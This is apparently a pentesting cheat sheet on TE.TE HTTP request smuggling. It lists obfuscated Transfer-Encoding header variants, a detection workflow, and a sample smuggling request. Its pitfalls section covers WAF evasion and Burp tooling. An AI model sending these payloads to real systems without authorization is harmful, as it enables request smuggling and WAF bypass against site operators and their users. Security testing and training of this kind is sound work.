# HTTP Request Smuggling — TE.TE (Header Obfuscation)

## When this applies

- Both front-end and back-end support `Transfer-Encoding`.
- One server (but not the other) ignores obfuscated TE variants.
- Goal: have one side honor TE while the other silently drops it.

## Technique

Send a POST with TWO `Transfer-Encoding` headers — one normal, one obfuscated. Whichever server is more lenient honors only one. Test all obfuscation variants until you find which one a particular server tolerates.

## Steps

### Obfuscation techniques

```
Transfer-Encoding: chunked
Transfer-encoding: cow

Transfer-Encoding: chunked
Transfer-Encoding: x

Transfer-Encoding: chunked
Transfer-Encoding: chunked

Transfer-Encoding : chunked

Transfer-Encoding: xchunked

Transfer-Encoding : chunked

Transfer-Encoding: chunked
Transfer-Encoding: x

Transfer-encoding: identity
Transfer-encoding: chunked
```

### Mechanism

- Both servers parse TE
- One server ignores the obfuscated variant (treats it as invalid → falls back to CL)
- The other server still parses the obfuscated variant
- Net effect: same as CL.TE or TE.CL depending on which side ignored what

### Impact

- More sophisticated than CL.TE / TE.CL
- Often bypasses WAFs that catch the simple cases
- Same attack capabilities as CL.TE / TE.CL

### Detection workflow

1. Send each obfuscation variant in turn.
2. Look for time-based hang or differential response.
3. Once a working variant is found, build the smuggling payload similar to CL.TE/TE.CL but with the obfuscated header.

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 3
Transfer-Encoding: chunked
Transfer-Encoding: x

8
SMUGGLED
0


```

## Verifying success

- One of the variants triggers smuggling-style behavior (hang, differential).
- Full smuggling payload using that variant lands the smuggled request on the back-end.
- WAFs that blocked the basic CL.TE variant pass the obfuscated form.

## Common pitfalls

- Some servers normalize whitespace before parsing — `Transfer-Encoding : chunked` works only on lenient servers.
- Burp may auto-fix duplicate headers — use the Inspector to insert raw headers.
- Try obfuscation variants in pairs (one per side) — attack works only when ONE side ignores.

## Tools

- Burp Suite Repeater (HTTP/1.1, raw header editing)
- Burp HTTP Request Smuggler BApp
- smuggler.py (https://github.com/defparam/smuggler)
